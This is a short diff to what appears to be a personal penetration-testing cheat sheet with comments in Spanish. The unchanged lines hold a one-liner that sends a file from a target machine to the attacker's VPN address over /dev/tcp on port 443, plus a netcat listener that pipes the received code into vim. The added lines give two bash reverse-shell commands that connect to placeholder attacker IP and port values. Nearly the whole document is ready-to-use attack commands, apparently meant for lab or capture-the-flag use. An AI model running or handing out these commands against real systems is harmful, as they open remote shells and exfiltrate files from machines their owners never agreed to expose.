@@ -16,3 +16,10 @@
 	ipTarged::: cat /path/file/test.py > /dev/tcp/ip_local_vpn/port_443
 
 	::: nc -nlvp 443 | vim -					"vim va a recibir el codigo para analizar mejor en local... <3 <3 <3"
+
+
+
+*** *** REVERSE SHELL BASH
+
+	::: bash -c "bash -i >& /dev/tcp/ip_vpn_here/port_vpn_here 0>&1"
+	::: /bin/bash -c "/bin/bash -i >& /dev/tcp/ip_vpn_here/port_vpn_here 0>&1"
